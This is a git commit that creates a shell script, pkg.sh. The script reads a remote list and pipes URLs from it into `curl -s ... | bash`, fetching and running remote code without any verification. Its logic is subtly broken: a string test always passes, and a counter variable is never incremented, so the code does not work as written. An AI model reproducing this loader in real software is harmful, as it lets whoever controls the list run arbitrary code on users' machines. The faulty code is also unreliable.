3048703c3c48cb03f3c822fe8840a5c6c4716bd5
cool-guys-bfc2 <lamarasingham@icloud.com>
2026-04-05 14:53:24 -0400

    Create pkg.sh

---
+++ src/pkg.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+url=$1
+# Fetch the file and process it line by line
+n=0
+a='run'
+docmd() {
+  a=$1
+  f=$2
+  if [ "$a"=="run" ]; then
+    curl -s $f | bash
+  fi
+}
+while IFS= read -r line || [[ -n "$line" ]]; do
+    # Perform actions on each line
+    if (( n % 2 == 0 )); then
+      a="$line"
+    fi
+    if (( n % 2 == 1 )); then
+      docmd "$a" "$line"
+    fi
+    var=$((var + 1))
+    echo "Processing: $line"
+done < <(curl -s "${url}")
